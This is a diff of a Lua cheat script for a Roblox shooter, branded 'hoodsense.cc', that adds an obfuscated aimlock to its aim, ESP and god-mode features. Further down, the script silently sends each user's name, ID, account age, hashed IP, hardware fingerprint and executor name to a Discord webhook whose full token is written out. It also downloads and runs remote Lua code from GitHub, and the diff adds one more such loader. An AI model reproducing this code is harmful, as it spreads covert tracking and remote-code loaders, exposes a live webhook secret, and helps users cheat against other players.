@@ -47,11 +47,10 @@ local Tab4 = Window:CreateTab("Extra")
 local Tab6 = Window:CreateTab("Credits")
 local Tab7 = Window:CreateTab("Settings")
 
-local Section1 = Tab1:CreateSection("Silent Aim Configuration")
+local Section1 = Tab1:CreateSection("Aim Configuration")
 local Section2 = Tab1:CreateSection("Fov Configuration")
 local Section99 = Tab1:CreateSection("Esp Configuration")
 local Section12 = Tab1:CreateSection("Toggles")
-local Section98 = Tab1:CreateSection("Other")
 local Section5 = Tab2:CreateSection("Guns")
 local Section11 = Tab2:CreateSection("Places")
 local Section6 = Tab3:CreateSection("Avatar Modifiactions")
@@ -93,6 +92,206 @@ local HitAirShootsToggle = Section1:CreateToggle("Hit Airshots", nil, function(b
     Aiming.Airshots = true
 end)
 HitAirShootsToggle:AddToolTip("Hits Airshots.")
+
+local aimlock = Section1:CreateToggle("Aimlock", nil, function()
+    getgenv().AimPart = "HumanoidRootPart"
+    getgenv().AimlockKey = "q"
+    getgenv().AimRadius = 30
+    getgenv().ThirdPerson = true
+    getgenv().FirstPerson = true
+    getgenv().TeamCheck = false
+    getgenv().PredictMovement = true
+    getgenv().PredictionVelocity = 9
+    local L_27_, L_28_, L_29_, L_30_ =
+        game:GetService "Players",
+    game:GetService "UserInputService",
+    game:GetService "RunService",
+    game:GetService "StarterGui"
+    local L_31_, L_32_, L_33_, L_34_, L_35_, L_36_, L_37_ =
+        L_27_.LocalPlayer,
+    L_27_.LocalPlayer:GetMouse(),
+    workspace.CurrentCamera,
+    CFrame.new,
+    Ray.new,
+    Vector3.new,
+    Vector2.new
+    local L_38_, L_39_, L_40_ = true, false, false
+    local L_41_
+    getgenv().CiazwareUniversalAimbotLoaded = true
+    getgenv().WorldToViewportPoint = function(L_42_arg0)
+        return L_33_:WorldToViewportPoint(L_42_arg0)
+    end
+    getgenv().WorldToScreenPoint = function(L_43_arg0)
+        return L_33_.WorldToScreenPoint(L_33_, L_43_arg0)
+    end
+    getgenv().GetObscuringObjects = function(L_44_arg0)
+        if L_44_arg0 and L_44_arg0:FindFirstChild(getgenv().AimPart) and L_31_ and L_31_.Character:FindFirstChild("Head") then
+            local L_45_ = workspace:FindPartOnRay(L_35_(L_44_arg0[getgenv().AimPart].Position, L_31_.Character.Head.Position))
+            if L_45_ then
+                return L_45_:IsDescendantOf(L_44_arg0)
+            end
+        end
+    end
+    getgenv().GetNearestTarget = function()
+        local L_46_ = {}
+        local L_47_ = {}
+        local L_48_ = {}
+        for L_50_forvar0, L_51_forvar1 in pairs(L_27_:GetPlayers()) do
+            if L_51_forvar1 ~= L_31_ then
+                table.insert(L_46_, L_51_forvar1)
+            end
+        end
+        for L_52_forvar0, L_53_forvar1 in pairs(L_46_) do
+            if L_53_forvar1.Character ~= nil then
+                local L_54_ = L_53_forvar1.Character:FindFirstChild("Head")
+                if getgenv().TeamCheck == true and L_53_forvar1.Team ~= L_31_.Team then
+                    local L_55_ =
+                        (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                    local L_56_ =
+                        Ray.new(
+                            game.Workspace.CurrentCamera.CFrame.p,
+                            (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_55_
+                        )
+                    local L_57_, L_58_ = game.Workspace:FindPartOnRay(L_56_, game.Workspace)
+                    local L_59_ = math.floor((L_58_ - L_54_.Position).magnitude)
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_55_
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_59_
+                    table.insert(L_48_, L_59_)
+                elseif getgenv().TeamCheck == false and L_53_forvar1.Team == L_31_.Team then
+                    local L_60_ =
+                        (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                    local L_61_ =
+                        Ray.new(
+                            game.Workspace.CurrentCamera.CFrame.p,
+                            (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_60_
+                        )
+                    local L_62_, L_63_ = game.Workspace:FindPartOnRay(L_61_, game.Workspace)
+                    local L_64_ = math.floor((L_63_ - L_54_.Position).magnitude)
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_60_
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_64_
+                    table.insert(L_48_, L_64_)
+                end
+            end
+        end
+        if unpack(L_48_) == nil then
+            return nil
+        end
+        local L_49_ = math.floor(math.min(unpack(L_48_)))
+        if L_49_ > getgenv().AimRadius then
+            return nil
+        end
+        for L_65_forvar0, L_66_forvar1 in pairs(L_47_) do
+            if L_66_forvar1.diff == L_49_ then
+                return L_66_forvar1.plr
+            end
+        end
+        return nil
+    end
+    L_32_.KeyDown:Connect(
+        function(L_67_arg0)
+            if L_67_arg0 == AimlockKey and L_41_ == nil then
+                pcall(
+                    function()
+                        if L_39_ ~= true then
+                            L_39_ = true
+                        end
+                        local L_68_
+                        L_68_ = GetNearestTarget()
+                        if L_68_ ~= nil then
+                            L_41_ = L_68_
+                        end
+                    end
+                )
+            elseif L_67_arg0 == AimlockKey and L_41_ ~= nil then
+                if L_41_ ~= nil then
+                    L_41_ = nil
+                end
+                if L_39_ ~= false then
+                    L_39_ = false
+                end
+            end
+        end
+    )
+    L_29_.RenderStepped:Connect(
+        function()
+            if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
+                if
+                    (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 or
+                    (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1
+                then
+                    L_40_ = true
+                else
+                    L_40_ = false
+                end
+            elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
+                if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 then
+                    L_40_ = true
+                else
+                    L_40_ = false
+                end
+            elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
+                if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1 then
+                    L_40_ = true
+                else
+                    L_40_ = false
+                end
+            end
+            if L_38_ == true and L_39_ == true then
+                if L_41_ and L_41_.Character and L_41_.Character:FindFirstChild(getgenv().AimPart) then
+                    if getgenv().FirstPerson == true then
+                        if L_40_ == true then
+                            if getgenv().PredictMovement == true then
+                                L_33_.CFrame =
+                                    L_34_(
+                                        L_33_.CFrame.p,
+                                        L_41_.Character[getgenv().AimPart].Position +
+                                        L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
+                                    )
+                            elseif getgenv().PredictMovement == false then
+                                L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
+                            end
+                        end
+                    elseif getgenv().ThirdPerson == true then
+                        if L_40_ == true then
+                            if getgenv().PredictMovement == true then
+                                L_33_.CFrame =
+                                    L_34_(
+                                        L_33_.CFrame.p,
+                                        L_41_.Character[getgenv().AimPart].Position +
+                                        L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
+                                    )
+                            elseif getgenv().PredictMovement == false then
+                                L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    )
+end)
+aimlock:AddToolTip("Enables Aimlock.")
+
+local aimlockkey = Section1:CreateToggle("Aimlock Key")
+aimlockkey:CreateKeybind("Q", function(L_69_arg0)
+    getgenv().AimlockKey = L_69_arg0
+end)
+aimlockkey:AddToolTip("Changes Aimlock Keybind.")
+local aimlockprediction = Section1:CreateTextBox("Aimlock Prediction", "Prediction", true, 	function(L_70_arg0)
+    PredictionVelocity = L_70_arg0
+end)
+aimlockprediction:SetValue("9")
+aimlockprediction:AddToolTip("Changes Prediction.")
+
+local aimlockaimpart = Section1:CreateDropdown("Aimpart", {"Head","UpperTorso","HumanoidRootPart","LowerTorso"}, function(L_71_arg0)
+    getgenv().AimPart = L_71_arg0
+end)
+aimlockaimpart:SetOption("UpperTorso")
+aimlockaimpart:AddToolTip("Changes Aimpart.")
 --------------------------------------------------------------------
 -------------------------//  FOV CIRCLE  \\-------------------------
 
@@ -248,14 +447,19 @@ local god = Section12:CreateButton("God Mode", function()
 end)
 god:AddToolTip("Makes you god mode. [THIS CANT BE STOPPED]")
 
----------------------------------------------------------------------
+local reset = Section12:CreateButton("Reset Character", function(reset)
+    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end)
+reset:AddToolTip("Resets your character")
+
+--[[-------------------------------------------------------------------
 -------------------------//  OTHER MODS   \\------------------------
 
 local reset = Section98:CreateButton("Reset Character", function(reset)
     game.Players.LocalPlayer.Character.Humanoid.Health = 0
 end)
 reset:AddToolTip("Resets your character")
-
+]]
 --------------------------------------------------------------------
 -----------------------------//  ESP   \\---------------------------
 local espToggle = Section99:CreateToggle("Enable ESP", nil, function(bool)
@@ -1559,9 +1763,28 @@ game.StarterGui:SetCore("SendNotification", {
 local url = 'https://discord.com/api/webhooks/962883148901929050/L9G5cfJ6Dpw4g_nHDye3mHvZOwDPr5FW2OyvzpQrFzUoUiCNqfw4BXfTELF9loTMtoUz'
 local req = syn.request
 local hwid_headers = {'Syn-Fingerprint'} -- You will have to add more headers for different exploits
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
 
 function ip()local a=req({Url='https://httpbin.org/ip',Method='GET'}) local b=game:GetService('HttpService'):JSONDecode(a.Body) local Hash = game:HttpGet('https://api.hashify.net/hash/md5/hex?value='..b.origin) local Hashed = game:GetService("HttpService"):JSONDecode(Hash) return Hashed.Digest end
 function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
+        (isexecutorclosure and "Script-Ware V2") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "SirHurt V4") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getreg()['CalamariLuaEnv'] and "Calamari") or
+        (unit and "Unit") or
+        ("Undetectable")
+    return exploit
+end
 
 local data = {
     ["username"]  = "hoodsense",
@@ -1578,7 +1801,7 @@ local data = {
             ["color"] = 229954,
             ["fields"] = {
                 {
-                    ["name"] = "Place ID",
+                    ["name"] = "Game ID",
                     ["value"] = "**Game ID: **"..game.PlaceId,
                 },
                 {
@@ -1597,12 +1820,16 @@ local data = {
                     ["value"] = "**Age: **"..game.Players.LocalPlayer.AccountAge,
                 },
                 {
+                    ["name"] = "Exploit",
+                    ["value"] = "```"..getexploit().."```"
+                },
+                {
                     ["name"] = "Job Id",
                     ["value"] = "```"..game.JobId.."```"
                 },
                 {
                     ["name"] = "Join Link:",
-                    ["value"] = "```https://roblox.GameLauncher.joinGameInstance(2788229376, "..game.JobId..")```",
+                    ["value"] = "```Roblox.GameLauncher.joinGameInstance(2788229376, "..game.JobId..")```",
                 },
                 {
                     ["name"] = "Hard Ware ID:",
@@ -1617,23 +1844,20 @@ local data = {
             ["thumbnail"] = {
                 ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
             },
-            ["footer"] = {
-                ["text"] = "HOODSENSE.CC \(https://hoodsense.cf\) | Relase ID = DP4UZs",
-            }
         }
     }
 }
-
-
 local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
-print("_____________________HOODSENSE.CC________________________")
-print("| [hoodsense.cc] Executed version: 5.9                  |")
-print("| [hoodsense.cc] Fixed silent aim!                      |")
-print("| [hoodsense.cc] Join us http://hoodsense.cf/discord    |")
-print("| [hoodsense.cc] Made by ekso <@804245361894883339>     |")
-print("| [hoodsense.cc] Website - https://hoodsense.cf         |")
-print("_________________________________________________________")
 
+print("___________________________HOODSENSE.CC__________________________")
+print("| [hoodsense.cc] Executed version: 5.9")
+print("| [hoodsense.cc] Your user is: "..game.Players.LocalPlayer.Name.. "") 
+print("| [hoodsense.cc] Your id is: "..game.Players.LocalPlayer.UserId.. "")
+print("| [hoodsense.cc] Job id: " ..game.JobId.. "")
+print("| [hoodsense.cc] Join us discord.gg/axq                 ")
+print("| [hoodsense.cc] Made by ekso <@804245361894883339>     ")
+print("| [hoodsense.cc] Website - https://hoodsense.cf         ")
+print("_________________________________________________________________")
 
 local Players = game:GetService("Players")
 
@@ -1651,6 +1875,8 @@ Players.PlayerAdded:Connect(function(player)
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p7.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p8.lua'))()
 end)
+wait(1)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
 
 -------------------------------------------------------------------------
 --[[
